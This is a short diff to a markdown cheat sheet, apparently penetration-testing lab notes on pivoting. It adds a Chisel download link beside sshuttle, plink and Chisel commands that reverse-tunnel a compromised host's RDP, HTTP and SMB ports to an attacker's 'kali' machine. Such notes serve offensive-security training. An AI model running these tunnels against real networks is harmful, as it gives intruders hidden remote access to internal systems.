@@ -692,6 +692,7 @@ sshuttle -r database_admin@192.168.50.63:22 10.4.50.0/24 172.16.50.0/24
 C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
 ```
 ### Chisel
+https://github.com/jpillora/chisel/releases
 ```bash
 ./chisel_1.7.5_linux_amd64 server -p 2345 --reverse
 chisel.exe client 192.168.45.157:2345 R:80:172.16.118.241:80 R:445:172.16.118.241:445
